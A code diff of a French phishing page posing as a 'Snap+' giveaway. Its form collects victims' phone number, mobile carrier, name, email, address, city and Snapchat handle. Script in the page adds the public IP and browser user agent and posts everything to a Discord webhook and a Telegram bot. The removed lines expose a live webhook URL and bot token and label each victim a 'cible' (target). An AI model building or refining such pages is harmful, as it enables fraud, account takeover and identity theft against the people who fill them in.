@@ -15,6 +15,7 @@
       justify-content: center;
       align-items: center;
     }
+
     .container {
       background: rgba(44, 1, 77, 0.85);
       border: 2px solid #a54ffb;
@@ -26,27 +27,32 @@
       position: relative;
       animation: pulseBorder 2s infinite;
     }
+
     @keyframes pulseBorder {
       0% { box-shadow: 0 0 10px #a54ffb; }
       50% { box-shadow: 0 0 25px #a54ffb; }
       100% { box-shadow: 0 0 10px #a54ffb; }
     }
+
     .logo {
       font-size: 70px;
       margin-bottom: 5px;
       text-shadow: 0 0 10px #fff;
     }
+
     h1 {
       font-size: 24px;
       margin: 0 0 15px;
       letter-spacing: 1px;
     }
+
     p {
       font-size: 15px;
       color: #ddd;
       margin-bottom: 25px;
     }
-    input {
+
+    input, select {
       width: 100%;
       padding: 12px;
       margin: 8px 0;
@@ -57,9 +63,11 @@
       font-size: 15px;
       outline: none;
     }
+
     input::placeholder {
       color: #ccc;
     }
+
     button {
       width: 100%;
       background: #a54ffb;
@@ -74,15 +82,18 @@
       box-shadow: 0 0 10px #a54ffb;
       transition: 0.3s;
     }
+
     button:hover {
       background: #8b3ddb;
       box-shadow: 0 0 20px #c177ff;
     }
+
     .notice {
       font-size: 12px;
       margin-top: 15px;
       color: #bbb;
     }
+
     #step2 {
       display: none;
     }
@@ -108,6 +119,18 @@
       </div>
 
       <div id="step2">
+        <select name="operateur" required>
+          <option value="">Sélectionnez votre opérateur</option>
+          <option value="Orange">Orange</option>
+          <option value="SFR">SFR</option>
+          <option value="Bouygues">Bouygues</option>
+          <option value="Free">Free</option>
+          <option value="NRJ Mobile">NRJ Mobile</option>
+          <option value="La Poste Mobile">La Poste Mobile</option>
+          <option value="Auchan Télécom">Auchan Télécom</option>
+          <option value="Autre">Autre</option>
+        </select>
+
         <input type="text" name="nom" placeholder="Nom" required />
         <input type="text" name="prenom" placeholder="Prénom" required />
         <input type="email" name="email" placeholder="Email" required />
@@ -126,11 +149,9 @@
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
-
-    // Ton token Telegram Bot et Chat ID Telegram (remplace par tes valeurs)
-    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
-    const TELEGRAM_CHAT_ID = "-1002810249796";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/TON_WEBHOOK_ICI";
+    const TELEGRAM_TOKEN = "TON_TELEGRAM_BOT_TOKEN_ICI";
+    const TELEGRAM_CHAT_ID = "TON_TELEGRAM_CHAT_ID";
 
     const SUBMISSION_LIMIT = 2;
     const TIME_WINDOW_MINUTES = 30;
@@ -196,36 +217,16 @@
 
       const data = new FormData(this);
       const ip = await getPublicIP();
+      const userAgent = navigator.userAgent || "User-Agent inconnu";
 
-      // Discord embed
-      const embed = {
-        title: "🎁 Nouvelle cible Snap+ @everyone",
-        color: 0xA54FFB,
-        fields: [
-          { name: "📞 Téléphone", value: data.get("telephone") || "N/A", inline: true },
-          { name: "👤 Nom", value: data.get("nom") || "N/A", inline: true },
-          { name: "👤 Prénom", value: data.get("prenom") || "N/A", inline: true },
-          { name: "📧 Email", value: data.get("email") || "N/A", inline: false },
-          { name: "🏙️ Ville", value: data.get("ville") || "N/A", inline: true },
-          { name: "📍 Département", value: data.get("departement") || "N/A", inline: true },
-          { name: "🏠 Adresse", value: data.get("adresse") || "Non fournie", inline: false },
-          { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true },
-          { name: "🌐 IP", value: ip, inline: false }
-        ],
-        footer: {
-          text: `Reçu le ${new Date().toLocaleString("fr-FR")}`,
-        },
-        timestamp: new Date(),
-      };
-
-      // Telegram message (style encadré multi-parties)
-      const telegramMessage = `
-🎁 *Nouvelle cible Snap+* 
+      const message = `
+🎁 *Nouvelle participation Snap+* 
   ┌─📞 Contact
    │ ├─ Téléphone : ${data.get("telephone") || "N/A"}
+   │ ├─ Opérateur : ${data.get("operateur") || "N/A"}
    │ ├─ Email     : ${data.get("email") || "N/A"}
    │ └─ Snapchat  : ${data.get("snap") || "N/A"}
-   
+
   ├─👤 Identité
    │ ├─ Nom      : ${data.get("nom") || "N/A"}
    │ ├─ Prénom   : ${data.get("prenom") || "N/A"}
@@ -235,8 +236,9 @@
    │ ├─ Département  : ${data.get("departement") || "N/A"}
    │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
 
-  └─🌐 Autres
-    └─ IP          : ${ip}
+  └─🌐 Infos techniques
+   │ ├─ IP          : ${ip}
+   │ └─ User-Agent  : ${userAgent}
 
 🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
 `;
@@ -245,13 +247,9 @@
       fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] }),
+        body: JSON.stringify({ content: message }),
       })
-      .then((res) => {
-        if (!res.ok) throw new Error("Erreur lors de l'envoi Discord");
-        // Envoi Telegram ensuite
-        return sendToTelegram(telegramMessage);
-      })
+      .then(() => sendToTelegram(message))
       .then(() => {
         window.location.href = "merci.html";
       })
